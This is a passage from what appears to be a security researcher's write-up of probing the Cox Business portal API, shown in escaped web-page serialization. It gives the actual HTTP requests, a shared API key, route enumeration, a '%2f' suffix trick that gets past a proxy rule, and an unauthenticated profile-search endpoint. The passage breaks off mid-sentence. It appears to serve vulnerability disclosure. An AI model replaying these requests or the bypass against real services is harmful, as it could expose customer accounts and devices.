\",[\"$\",\"code\",null,{\"children\":\"api/cbma\",\"className\":\"__className_8a4d12\"}],\", it responds with a 302 redirect instead of the 500 internal server error triggered from \",[\"$\",\"code\",null,{\"children\":\"api/cbma\",\"className\":\"__className_8a4d12\"}],\".\"]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"This indicated that they were proxying API requests to a dedicated backend while serving the frontend files from the normal system.\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"Since the API itself had all of the interesting device management functionality, it made sense to focus on everything behind the \",[\"$\",\"code\",null,{\"children\":\"api/cbma\",\"className\":\"__className_8a4d12\"}],\" route and see if there was any low hanging fruit like exposed actuators, API documentation, or any directory traversal vulnerabilities that would allow us to escalate permissions.\"]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"I went ahead and proxied the registration request for the Cox Business portal which was underneath the \",[\"$\",\"code\",null,{\"children\":\"api/cbma\",\"className\":\"__className_8a4d12\"}],\" path:\"]}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"__className_8a4d12\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"POST\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"/api/cbma/userauthorization/services/profile/validate/v1/email\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"HTTP/1.1\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"Host:\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"myaccount-business.cox.com\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"User-Agent:\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"Mozilla/5.0\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"(Windows\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"NT\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-number\",\"children\":\"10.0\"}],[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\";\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"Win64;\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"x64;\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"rv:124.0)\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"Gecko/20100101\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"Firefox/124.0\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"Accept:\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"application/json,\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"text/plain,\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"*/*\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"Content-Type:\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"application/json\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"Clientid:\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"cbmauser\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"Apikey:\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"5d228662-aaa1-4a18-be1c-fb84db78cf13\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"Cb_session:\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"unauthenticateduser\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"Authorization:\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"Bearer\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"undefined\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"Ma_transaction_id:\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"a85dc5e0-bd9d-4f0d-b4ae-4e284351e4b4\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"Content-Length:\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-number\",\"children\":\"28\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"Connection:\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"close\"}],\"\\n\\n{\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"email\\\"\"}],[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\":\\\"test@example.com\\\"\"}],\"}\\n\"]}]}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"__className_8a4d12\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"HTTP/1.1\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-number\",\"children\":\"200\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"OK\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"Content-Type:\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"application/json\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"Content-Length:\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-number\",\"children\":\"126\"}],\"\\n\\n{\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"message\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"Success\\\"\"}],\",\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"id\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"test@example.com\\\"\"}],\"\\n}\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"The HTTP request contained a bunch of different authorization headers including what looked to be a general-use API key that was shared between users. The \",[\"$\",\"code\",null,{\"children\":\"clientid\",\"className\":\"__className_8a4d12\"}],\" and \",[\"$\",\"code\",null,{\"children\":\"Cb_session\",\"className\":\"__className_8a4d12\"}],\" keys looked very custom and indicated there were multiple roles and permissions used in the application.\"]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"The HTTP response looked like a generic Spring response, and we could likely quickly confirm that the backend API was running spring by simply changing the POST to GET and observing the response:\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"__className_8a4d12\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"GET\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"/api/cbma/userauthorization/services/profile/validate/v1/email\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"HTTP/1.1\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"Host:\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"myaccount-business.cox.com\"}],\"\\n\"]}]}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"__className_8a4d12\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"HTTP/1.1\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-number\",\"children\":\"500\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"Internal\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"Server\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"Error\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"Content-type:\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"application/json\"}],\"\\n\\n{\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"timestamp\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"2024-04-12T08:57:14.384+00:00\\\"\"}],\",\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"status\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-number\",\"children\":\"500\"}],\",\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"error\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"Internal Server Error\\\"\"}],\",\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"path\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"/services/profile/validate/v1/email\\\"\"}],\"\\n}\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"Yup, that was definitely a Spring error. Since we could confirm that the reverse proxy was running Spring, I decided to look for actuators and exposed API docs.\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"I went ahead and tried to guess the actuator route:\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"__className_8a4d12\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"❌\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"GET\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"/api/cbma/userauthorization/services/profile/validate/v1/email/actuator/\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"❌\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"GET\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"/api/cbma/userauthorization/services/profile/validate/v1/actuator/\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"❌\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"GET\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"/api/cbma/userauthorization/services/profile/validate/actuator/\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"❌\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"GET\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"/api/cbma/userauthorization/services/profile/actuator/\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"❌\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"GET\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"/api/cbma/userauthorization/services/actuator/\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"❌\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"GET\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"/api/cbma/userauthorization/actuator/\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"❌\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"GET\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"/api/cbma/actuator/\"}],\"\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"Shame, no easy actuators. I then checked for accessible API documentation:\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"__className_8a4d12\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"❌\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"GET\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"/api/cbma/userauthorization/services/profile/validate/v1/email/swagger-ui/index.html\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"❌\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"GET\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"/api/cbma/userauthorization/services/profile/validate/v1/swagger-ui/index.html\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"❌\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"GET\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"/api/cbma/userauthorization/services/profile/validate/swagger-ui/index.html\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"❌\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"GET\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"/api/cbma/userauthorization/services/profile/swagger-ui/index.html\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"❌\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"GET\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"/api/cbma/userauthorization/services/swagger-ui/index.html\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"✅\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"GET\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"/api/cbma/userauthorization/swagger-ui/index.html\"}],\"\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"We had a hit! There was a swagger landing page at \",[\"$\",\"code\",null,{\"children\":\"/api/cbma/profile/swagger-ui/index.html\",\"className\":\"__className_8a4d12\"}],\". I loaded the page expecting to see API routes, however...\"]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"$\",\"figure\",null,{\"className\":\"prose-img flex flex-col items-center\",\"children\":[[\"$\",\"$L10\",null,{\"src\":\"https://i.imgur.com/JEAdxo3.png\",\"alt\":\"\",\"layout\":\"responsive\",\"loading\":\"lazy\",\"width\":100,\"height\":100}],[\"$\",\"figcaption\",null,{\"children\":\"\"}]]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"Totally empty. Something was causing the page not to load. I checked the network traffic and there seemed to be in an infinite redirect loop when attempting to load any static resource:\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"__className_8a4d12\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"GET\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"/api/cbma/ticket/services/swagger-ui/swagger-initializer.js\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"HTTP/1.1\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"Location:\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"/cbma/api/cbma/userauthorization/services/swagger-ui/swagger-initializer.js\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"...\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"GET\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"/cbma/api/cbma/ticket/services/swagger-ui/swagger-initializer.js\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"HTTP/1.1\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"Location:\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"/cbma/cbma/api/cbma/userauthorization/services/swagger-ui/swagger-initializer.js\"}],\"\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"It seemed that requests to load static resources for the page (\",[\"$\",\"code\",null,{\"children\":\".png\",\"className\":\"__className_8a4d12\"}],\", \",[\"$\",\"code\",null,{\"children\":\".js\",\"className\":\"__className_8a4d12\"}],\", \",[\"$\",\"code\",null,{\"children\":\".css\",\"className\":\"__className_8a4d12\"}],\") were all being routed through the base URI instead of the reverse proxy API host. What this meant was there was probably a proxy rule for static assets, so I changed the extension to test this:\"]}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"__className_8a4d12\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"GET\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"/api/cbma/userauthorization/services/swagger-ui/swagger-initializer.anythingElse\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"HTTP/1.1\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"Host:\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"myaccount-business.cox.com\"}],\"\\n\"]}]}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"__className_8a4d12\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"HTTP/1.1\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-number\",\"children\":\"500\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"Internal\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"Server\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"Error\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"Server:\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"nginx\"}],\"\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"After confirming that the \",[\"$\",\"code\",null,{\"children\":\".js\",\"className\":\"__className_8a4d12\"}],\" extension was triggering the routing of the request to the original host, we now needed to find a way to load the resource from the API reverse proxy but without hitting the rule condition which switched routing for static files. The simplest way to do this, since the request was being proxied, was to check if there was any character that we could add which would “drop off” in transit.\"]}],\"\\n\",[\"$\",\"h3\",null,{\"id\":\"loading-static-resources-from-reverse-proxy-api\",\"children\":\"Loading Static Resources from Reverse Proxy API\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"To fuzz this, I simply used Burp’s intruder to enumerate from \",[\"$\",\"code\",null,{\"children\":\"%00\",\"className\":\"__className_8a4d12\"}],\" to \",[\"$\",\"code\",null,{\"children\":\"%FF\",\"className\":\"__className_8a4d12\"}],\" at the end of the URL. After about 30 seconds of running, we had a 200 OK by appending the URL encoded \",[\"$\",\"code\",null,{\"children\":\"/\",\"className\":\"__className_8a4d12\"}],\" symbol:\"]}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"__className_8a4d12\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"GET\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"/api/cbma/userauthorization/services/swagger-ui/swagger-initializer.js%2f\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"HTTP/1.1\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"Host:\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"myaccount-business.cox.com\"}],\"\\n\"]}]}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"__className_8a4d12\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-variable constant_\",\"children\":\"HTTP\"}],\"/\",[\"$\",\"span\",null,{\"className\":\"hljs-number\",\"children\":\"2\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-number\",\"children\":\"200\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-variable constant_\",\"children\":\"OK\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-title class_\",\"children\":\"Content\"}],\"-\",[\"$\",\"span\",null,{\"className\":\"hljs-title class_\",\"children\":\"Type\"}],\": application/javascript\\n\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-variable language_\",\"children\":\"window\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"onload\"}],\" = \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"function\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-params\"}],\") { \",[\"$\",\"span\",null,{\"className\":\"hljs-variable language_\",\"children\":\"window\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"ui\"}],\" = \",[\"$\",\"span\",null,{\"className\":\"hljs-title class_\",\"children\":\"SwaggerUIBundle\"}],\"({ \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"url\"}],\": \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"https://petstore.swagger.io/v2/swagger.json\\\"\"}],\", \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"dom_id\"}],\": \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'#swagger-ui'\"}],\", \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"deepLinking\"}],\": \",[\"$\",\"span\",null,{\"className\":\"hljs-literal\",\"children\":\"true\"}],\", \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"presets\"}],\": [ \",[\"$\",\"span\",null,{\"className\":\"hljs-title class_\",\"children\":\"SwaggerUIBundle\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"presets\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"apis\"}],\", \",[\"$\",\"span\",null,{\"className\":\"hljs-title class_\",\"children\":\"SwaggerUIStandalonePreset\"}],\" ], \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"plugins\"}],\": [ \",[\"$\",\"span\",null,{\"className\":\"hljs-title class_\",\"children\":\"SwaggerUIBundle\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"plugins\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"DownloadUrl\"}],\" ], \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"layout\"}],\": \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"StandaloneLayout\\\"\"}],\" , \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"configUrl\\\"\"}],\" : \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"/services/v3/api-docs/swagger-config\\\"\"}],\", \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"validatorUrl\\\"\"}],\" : \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"\\\"\"}],\" }); \",[\"$\",\"span\",null,{\"className\":\"hljs-comment\",\"children\":\"//\u003c/editor-fold\u003e };\"}],\"\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"By appending the \",[\"$\",\"code\",null,{\"children\":\"%2f\",\"className\":\"__className_8a4d12\"}],\" to the \",[\"$\",\"code\",null,{\"children\":\".js\",\"className\":\"__className_8a4d12\"}],\" extension, we could load the JS files. I wrote a rule to append \",[\"$\",\"code\",null,{\"children\":\"%2f\",\"className\":\"__className_8a4d12\"}],\" to all static resources using Burp’s match-and-replace then reloaded the page.\"]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"$\",\"figure\",null,{\"className\":\"prose-img flex flex-col items-center\",\"children\":[[\"$\",\"$L10\",null,{\"src\":\"https://i.imgur.com/m332NDr.png\",\"alt\":\"\",\"layout\":\"responsive\",\"loading\":\"lazy\",\"width\":100,\"height\":100}],[\"$\",\"figcaption\",null,{\"children\":\"\"}]]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"Perfect, the swagger routes had loaded. I used the same trick to load all the swagger docs on all of the other API endpoints. In total, there were about 700 different API calls with each API having the following number of calls:\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"children\":\"account (115 routes)\\nvoiceutilities (73 routes)\\nuser (70 routes)\\ndatainternetgateway (57 routes)\\naccountequipment (55 routes)\\nbilling (53 routes)\\nticket (52 routes)\\nprofile (47 routes)\\nvoicecallmanagement (46 routes)\\nvoicemail (37 routes)\\nvoiceusermanagement (30 routes)\\nuserauthorization (24 routes)\\ncsr (16 routes)\\nvoiceprofile (14 routes)\\n\",\"className\":\"__className_8a4d12\"}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"After quickly skimming through everything, the following APIs appeared to have the most functionality for interacting with hardware and accessing customer accounts:\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"children\":\"accountequipment (55 routes)\\ndatainternetgateway (57 routes)\\naccount (115 routes)\\n\",\"className\":\"__className_8a4d12\"}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"Copying the HTTP request that I’d used to register to the website, I ran an intruder script to hit every single GET endpoint to check if there were any accessible unauthenticated API endpoints. What came back was really interesting. There was a 50/50 split of endpoints which gave an authorization error or 200 OK HTTP response.\"}],\"\\n\",[\"$\",\"h3\",null,{\"id\":\"accidentally-discovering-an-authorization-bypass-on-the-cox-backend-api\",\"children\":\"Accidentally Discovering an Authorization Bypass on the Cox Backend API\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"After the intruder scan of all of the API endpoints completed, I scrolled through to see if any had any interesting responses. The following \\\"profilesearch\\\" endpoint had an interesting HTTP response which appeared to be returning a blank JSON object from what looked to be an empty search:\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"__className_8a4d12\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"GET\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"/api/cbma/profile/services/profile/profilesearch/\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"HTTP/1.1\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"Host:\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"myaccount-business.cox.com\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"Clientid:\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"cbmauser\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"Apikey:\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"5d228662-aaa1-4a18-be1c-fb84db78cf13\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"Cb_session:\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"unauthenticateduser\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"Authorization:\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"Bearer\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"undefined\"}],\"\\n\"]}]}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"__className_8a4d12\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"HTTP/1.1\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-number\",\"children\":\"200\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"OK\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"Content-type:\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"application/json\"}],\"\\n\\n{\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"message\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"Success\\\"\"}],\",\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"profile\\\":\"}],\" {\\n    \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"numberofRecords\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"0 hits\\\"\"}],\",\\n    \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"searchList\\\":\"}],\" []\\n  }\\n}\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"From looking at the JavaScript, it seemed that we’d need to add an argument to the URI for a profile to search for. I went ahead and typed in \",[\"$\",\"code\",null,{\"children\":\"test\",\"className\":\"__className_8a4d12\"}],\" into the URI and got the following 